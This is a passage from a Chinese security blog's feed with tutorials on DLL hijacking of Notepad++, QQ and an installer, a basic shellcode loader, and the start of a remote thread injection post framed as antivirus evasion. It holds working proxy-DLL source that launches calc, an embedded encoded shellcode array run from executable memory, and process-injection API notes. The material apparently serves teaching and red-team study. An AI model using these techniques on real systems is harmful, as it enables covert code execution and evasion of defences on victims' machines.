class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HINSTANCE hDll = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;SciLexer_re.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDll)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//typedef 是定义了一个新的类型</span></span><br><span class="line">        <span class="comment">//DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD</span></span><br><span class="line">        <span class="comment">//定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针</span></span><br><span class="line">        <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* EXPFUNC)</span><span class="params">()</span></span>;</span><br><span class="line">        EXPFUNC expFunc = <span class="literal">NULL</span>;</span><br><span class="line">        expFunc = (EXPFUNC)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;Scintilla_DirectFunction&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (expFunc)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">expFunc</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将原始dll文件SciLexer.dll改名为SciLexer_re.dll，将该文件改名为SciLexer.dll并放到notepad++.exe的目录下，该dll起了转发的作用，调用顺序为exe-&gt;SciLexer.dll-&gt;SciLexer_re.dll</p><p><strong>需要注意的是，本次测试环境vs2019配置release x86生成的dll才能正常运行，猜测notepad++为32位。</strong></p><p><img src="http://cdn.polowong.top/image-20220228214429289.png" alt="image-20220228214429289"></p><p>运行notepad.exe即可弹出计算器，但是无法正常运行notepad.exe</p><p><img src="http://cdn.polowong.top/image-20220228214502134.png" alt="image-20220228214502134"></p><h2 id="直接转发劫持QQ"><a href="#直接转发劫持QQ" class="headerlink" title="直接转发劫持QQ"></a>直接转发劫持QQ</h2><p>这里还是使用导入表进行劫持，首先用cff(下载地址:[<a href="https://ntcore.com/files/CFF_Explorer.zip]">https://ntcore.com/files/CFF_Explorer.zip]</a>) 打开QQ.exe的导入表，找一个不在<code>HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Session) Manager\KnownDLLs</code>路径里面的dll进行劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。这里我选择的是<code>libuv.dll</code>进行劫持</p><p><img src="http://cdn.polowong.top/image-20220228213308186.png" alt="image-20220228213308186"></p><p>使用aheadlib生成cpp文件并放到vscode的dll项目中，代码如下，记住libuvOrg这个名字，后面要用。</p><p><img src="http://cdn.polowong.top/image-20220228213801554.png" alt="image-20220228213801554"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;</span>)</span></span><br><span class="line"><span class="comment">// 获取原始函数地址</span></span><br><span class="line"><span class="function">FARPROC WINAPI <span class="title">GetAddress</span><span class="params">(PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;</span>)</span></span><br><span class="line"><span class="comment">//代码很长，我去了大部分#pragma comment(linker, &quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;)形式的自动生成的代码</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>采用release x86编译生成dll文件</strong>，将生成的dll文件命名位libuv.dll并放到原dll目录下，将原dll文件命名为libuvOrg.dll，双击qq.exe即可弹出计算器</p><p><img src="http://cdn.polowong.top/image-20220228213922826.png" alt="image-20220228213922826"></p><p><img src="http://cdn.polowong.top/image-20220228214207103.png" alt="image-20220228214207103"></p><h2 id="即时调用劫持QQ"><a href="#即时调用劫持QQ" class="headerlink" title="即时调用劫持QQ"></a>即时调用劫持QQ</h2><p>todo，一直报错，麻了。</p><h2 id="劫持不存在的dll–音速启动"><a href="#劫持不存在的dll–音速启动" class="headerlink" title="劫持不存在的dll–音速启动"></a>劫持不存在的dll–音速启动</h2><p>音速启动V5安装程序，打开procmon过滤进程名和NAME NOT FOUND：</p><p><img src="http://cdn.polowong.top/image-20220301202140714.png" alt="image-20220301202140714"></p><p>发现音速启动在当前安装目录尝试加载DLL，打开一些NOT FOUND 的dll调用栈看一下</p><p><img src="http://cdn.polowong.top/image-20220301202437109.png" alt="image-20220301202437109"></p><p>尝试劫持，将上文生成的dll hijack demo改名为SHFOLDER.dll并放至与安装文件同目录</p><p>再次运行安装文件，即可弹出计算器</p><p><img src="http://cdn.polowong.top/image-20220301202529573.png" alt="image-20220301202529573"></p><h1 id="自动化DLL劫持检测工具–Rattler"><a href="#自动化DLL劫持检测工具–Rattler" class="headerlink" title="自动化DLL劫持检测工具–Rattler"></a>自动化DLL劫持检测工具–Rattler</h1><p>github地址：<a href="https://github.com/sensepost/rattler/releases/tag/v1.0">https://github.com/sensepost/rattler/releases/tag/v1.0</a></p><p>使用时需要注意，要根据程序是64位还是32位选择Rattler版本，否则识别失败。</p><p><img src="http://cdn.polowong.top/image-20220301221252204.png" alt="image-20220301221252204"></p><p>使用Rattler建议的DLL文件尝试劫持</p><p><img src="http://cdn.polowong.top/image-20220301221509251.png" alt="image-20220301221509251"></p><p>将生成的CRYPTBASE.DLL放到应用根目录，可以看到成功弹出了计算器</p><p><img src="http://cdn.polowong.top/image-20220301221540672.png" alt="image-20220301221540672"></p><p><img src="http://cdn.polowong.top/image-20220301221608661.png" alt="image-20220301221608661"></p><h1 id="红队武器化"><a href="#红队武器化" class="headerlink" title="红队武器化"></a>红队武器化</h1><p>todo，<a href="https://www.anquanke.com/post/id/232891">https://www.anquanke.com/post/id/232891</a></p><h2 id="白加黑免杀实现"><a href="#白加黑免杀实现" class="headerlink" title="白加黑免杀实现"></a>白加黑免杀实现</h2><h2 id="权限维持实现"><a href="#权限维持实现" class="headerlink" title="权限维持实现"></a>权限维持实现</h2><h1 id="DLL劫持防御及实例"><a href="#DLL劫持防御及实例" class="headerlink" title="DLL劫持防御及实例"></a>DLL劫持防御及实例</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/232891">https://www.anquanke.com/post/id/232891</a></p><p><a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p><p><a href="https://drunkmars.top/2021/10/03/dll%E5%8A%AB%E6%8C%81/">https://drunkmars.top/2021/10/03/dll%E5%8A%AB%E6%8C%81/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是DLL&quot;&gt;&lt;a href=&quot;#什么是DLL&quot; class=&quot;headerlink&quot; title=&quot;什么是DLL&quot;&gt;&lt;/a&gt;什么是DLL&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>免杀基础之认识shellcode加载器</title>
    <link href="https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</id>
    <published>2022-01-15T09:37:24.000Z</published>
    <updated>2022-01-15T09:37:29.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="认识shellcode加载器"><a href="#认识shellcode加载器" class="headerlink" title="认识shellcode加载器"></a>认识shellcode加载器</h1><p>下面是一个最简单的shellcode加载器，目的是将shellcode加载到内存中并执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line">        <span class="string">&quot;\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\xff\xff\x48\xbb\xa2\xd8\x0e\xfe\xd3\xcd\x9c\xae\x48\x31\x58&quot;</span></span><br><span class="line">        <span class="string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5e\x90\x8d\x1a\x23\x25&quot;</span></span><br><span class="line">        <span class="string">&quot;\x5c\xae\xa2\xd8\x4f\xaf\x92\x9d\xce\xff\xf4\x90\x3f\x2c\xb6&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x17\xfc\xc2\x90\x85\xac\xcb\x85\x17\xfc\x82\x90\x85\x8c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x83\x85\x93\x19\xe8\x92\x43\xcf\x1a\x85\xad\x6e\x0e\xe4\x6f&quot;</span></span><br><span class="line">        <span class="string">&quot;\x82\xd1\xe1\xbc\xef\x63\x11\x03\xbf\xd2\x0c\x7e\x43\xf0\x99&quot;</span></span><br><span class="line">        <span class="string">&quot;\x5f\xb6\x58\x9f\xbc\x25\xe0\xe4\x46\xff\x03\x46\x1c\x26\xa2&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd8\x0e\xb6\x56\x0d\xe8\xc9\xea\xd9\xde\xae\x58\x85\x84\xea&quot;</span></span><br><span class="line">        <span class="string">&quot;\x29\x98\x2e\xb7\xd2\x1d\x7f\xf8\xea\x27\xc7\xbf\x58\xf9\x14&quot;</span></span><br><span class="line">        <span class="string">&quot;\xe6\xa3\x0e\x43\xcf\x1a\x85\xad\x6e\x0e\x99\xcf\x37\xde\x8c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x9d\x6f\x9a\x38\x7b\x0f\x9f\xce\xd0\x8a\xaa\x9d\x37\x2f\xa6&quot;</span></span><br><span class="line">        <span class="string">&quot;\x15\xc4\xea\x29\x98\x2a\xb7\xd2\x1d\xfa\xef\x29\xd4\x46\xba&quot;</span></span><br><span class="line">        <span class="string">&quot;\x58\x8d\x80\xe7\xa3\x08\x4f\x75\xd7\x45\xd4\xaf\x72\x99\x56&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x8b\x93\xc5\xf4\xe3\x80\x4f\xa7\x92\x97\xd4\x2d\x4e\xf8&quot;</span></span><br><span class="line">        <span class="string">&quot;\x4f\xac\x2c\x2d\xc4\xef\xfb\x82\x46\x75\xc1\x24\xcb\x51\x5d&quot;</span></span><br><span class="line">        <span class="string">&quot;\x27\x53\xb7\x6d\xba\xef\x9c\xfd\xeb\x3c\xfe\xd3\x8c\xca\xe7&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2b\x3e\x46\x7f\x3f\x6d\x9d\xae\xa2\x91\x87\x1b\x9a\x71\x9e&quot;</span></span><br><span class="line">        <span class="string">&quot;\xae\xa3\x63\xce\x56\x7d\xce\xdd\xfa\xeb\x51\xea\xb2\x5a\x3c&quot;</span></span><br><span class="line">        <span class="string">&quot;\xdd\x14\xee\xaf\x28\xf9\x2c\x18\xd0\x27\x48\xb0\x0f\xff\xd3&quot;</span></span><br><span class="line">        <span class="string">&quot;\xcd\xc5\xef\x18\xf1\x8e\x95\xd3\x32\x49\xfe\xf2\x95\x3f\x37&quot;</span></span><br><span class="line">        <span class="string">&quot;\x9e\xfc\x5c\xe6\x5d\x18\x46\x77\x11\x85\x63\x6e\xea\x51\xcf&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x69\x27\x93\x71\x42\x27\xdb\xb6\x5a\x0a\xf6\xbe\xe3\x80&quot;</span></span><br><span class="line">        <span class="string">&quot;\x42\x77\x31\x85\x15\x57\xe3\x62\x97\x5b\xa7\xac\x63\x7b\xea&quot;</span></span><br><span class="line">        <span class="string">&quot;\x59\xca\xbe\xd1\xcd\x9c\xe7\x1a\xbb\x63\x9a\xd3\xcd\x9c\xae&quot;</span></span><br><span class="line">        <span class="string">&quot;\xa2\x99\x5e\xbf\x83\x85\x15\x4c\xf5\x8f\x59\xb3\xe2\x0d\xf6&quot;</span></span><br><span class="line">        <span class="string">&quot;\xa3\xfb\x99\x5e\x1c\x2f\xab\x5b\xea\x86\x8c\x0f\xff\x9b\x40&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd8\x8a\xba\x1e\x0e\x96\x9b\x44\x7a\xf8\xf2\x99\x5e\xbf\x83&quot;</span></span><br><span class="line">        <span class="string">&quot;\x8c\xcc\xe7\x5d\x18\x4f\xae\x9a\x32\x54\xe3\x2b\x19\x42\x77&quot;</span></span><br><span class="line">        <span class="string">&quot;\x12\x8c\x26\xd7\x6e\xe7\x88\x01\x06\x85\xad\x7c\xea\x27\xc4&quot;</span></span><br><span class="line">        <span class="string">&quot;\x75\xdd\x8c\x26\xa6\x25\xc5\x6e\x01\x06\x76\x6c\x1b\x00\x8e&quot;</span></span><br><span class="line">        <span class="string">&quot;\x4f\x44\x75\x58\x21\x33\x5d\x0d\x46\x7d\x17\xe5\xa0\xa8\xde&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd2\x8e\x05\x33\xb8\x99\x15\xe5\xcb\x7c\x91\xb9\xcd\xc5\xef&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2b\x02\xf1\x2b\xd3\xcd\x9c\xae&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="keyword">sizeof</span> buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buf, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">    ((<span class="built_in"><span class="keyword">void</span></span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，VirtualAlloc()的作用是在虚拟内存空间中申请一块区域</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   VirtualAlloc(</span></span><br><span class="line"><span class="comment">       NULL, // 基址</span></span><br><span class="line"><span class="comment">       800,  // 大小</span></span><br><span class="line"><span class="comment">       MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">       PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">       );</span></span><br><span class="line"><span class="comment">   */</span></span><br></pre></td></tr></table></figure><p><strong>void *memcpy(void *str1, const void *str2, size_t n)</strong> 从存储区 <strong>str2</strong> 复制 <strong>n</strong> 个字节到存储区 <strong>str1</strong>,在上述实例中是将buf复制到exec中，大小为sizeof(buf)</p><p>下面这句话比较关键，</p><p>((void(*)())exec)()</p><p>理解这句话首先要回顾c语言相关知识，*p代表一个指针，指针指向某个函数的地址，而*p()则代表了调用p所指向的函数。</p><p>标准的调用方法为(*p)(),简写为<strong>p()</strong></p><p>示例如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Max</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)(<span class="keyword">int</span>, <span class="keyword">int</span>);  <span class="comment">//定义一个函数指针</span></span><br><span class="line">    <span class="keyword">int</span> a, b, c,d;</span><br><span class="line">    p = Max;  <span class="comment">//把函数Max赋给指针变量p, 使p指向Max函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please enter a and b:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">p</span>(a, b);    <span class="comment">// 通过函数指针调用Max函数</span></span><br><span class="line">    d = (*p)(a, b); <span class="comment">// 这样调用也行</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\nb = %d\nmax = %d,%d\n&quot;</span>, a, b, c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Max</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span>  <span class="comment">//定义Max函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> z;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">    &#123;</span><br><span class="line">        z = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        z = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">please enter a and b:3 4</span><br><span class="line">a &#x3D; 3</span><br><span class="line">b &#x3D; 4</span><br><span class="line">max &#x3D; 4</span><br></pre></td></tr></table></figure><p>在上述代码中定义了int型的指针p，p指向一个函数，该函数接受两个int型的参数</p><p>如果p是指向返回类型为void的函数的指针，那么p的声明应该类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void (*p)();</span><br></pre></td></tr></table></figure><p>在c语言的类型转换中，如果想把float类型转为int型的话，强制类型转换方法如下：</p><p>float a=1.1;</p><p>float b=(int)a;</p><p>虽然上述例子与int b=a;的结果一致，但上述例子突出了使用强制类型转换：把变量a从float类型专为了int类型，那么我们可以得到类型转换的方法为在变量前面加**(type)<strong>，这里的</strong>type<strong>就是</strong>int**,即**(int)<strong>,我们从变量声明的int a;到类型转换的(int) a 的区别为：去掉</strong>变量名**与分号，并将剩余部分括起来，就得到了int型的强制类型转换方法。</p><p>如果我们想得到一个void类型的函数的指针应该怎么做？</p><p>上面提到的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void (*p)();</span><br></pre></td></tr></table></figure><p>是一个void类型的函数指针p的<strong>变量声明</strong>，根据上述规则，强制转换方法为**(void (<em>)())**,即我们可以在某变量前面添加*</em>(void (*)())**将其强制转换为返回值为空的指向函数的指针类型。</p><p>现在再把下面的代码拆开理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(    (void(*)())    exec    )()；</span><br></pre></td></tr></table></figure><p><strong>(void(<em>)())<strong>代表将exec转为返回值为空的指针类型，</strong>(    (void(</em>)())    exec    )()<strong>和</strong>(   * (void(*)())    exec    )()<strong>等价，都是代表调用返回值类型为</strong>void</strong>的<strong>函数指针exec</strong>所指向的函数.</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://fengwenhua.top/index.php/archives/64/">https://fengwenhua.top/index.php/archives/64/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;认识shellcode加载器&quot;&gt;&lt;a href=&quot;#认识shellcode加载器&quot; class=&quot;headerlink&quot; title=&quot;认识shellcode加载器&quot;&gt;&lt;/a&gt;认识shellcode加载器&lt;/h1&gt;&lt;p&gt;下面是一个最简单的shellcode加载器，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>免杀基础之远程线程注入</title>
    <link href="https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</id>
    <published>2022-01-15T09:36:51.000Z</published>
    <updated>2022-01-15T09:36:54.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要参考</p><p><a href="https://fengwenhua.top/index.php/archives/65/%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81%E5%8F%82%E8%80%83https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/%E4%B8%AD%E7%9A%84high">https://fengwenhua.top/index.php/archives/65/，其中最终代码参考https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/中的high</a> level API。</p><h1 id="远程线程中执行shellcode"><a href="#远程线程中执行shellcode" class="headerlink" title="远程线程中执行shellcode"></a>远程线程中执行shellcode</h1><p>shellcode代码与地址无关，理论上将shellcode放入任意程序中给它一个起点就可以执行，因此考虑将shellcode注入到其他进程中以起到隐蔽执行的目的，可以考虑注入到经常进行网络连接的进程中以起到更好的隐蔽效果。</p><h1 id="流程与函数介绍"><a href="#流程与函数介绍" class="headerlink" title="流程与函数介绍"></a>流程与函数介绍</h1><h2 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx()"></a>VirtualAllocEx()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,         <span class="comment">// 申请内存所在的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,        <span class="comment">// 保留页面的内存地址，一般用NULL自动分配</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,           <span class="comment">// 欲分配的内存大小，字节为单位，通常是shellcode大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType, <span class="comment">// 指定要分配的内存类型，常用 MEM_RESERVE | MEM_COMMIT</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect         <span class="comment">// 指定分配的内存保护，由于它将包含要执行的代码，因此常用 PAGE_EXECUTE_READWRITE，可读可写可执行</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>VirtualAllocEx()<strong>用于在指定进程开辟内存空间，所需参数主要为进程的handler，所以需要使用</strong>OpenProcess</strong>函数获取。</p><h2 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess()"></a>OpenProcess()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 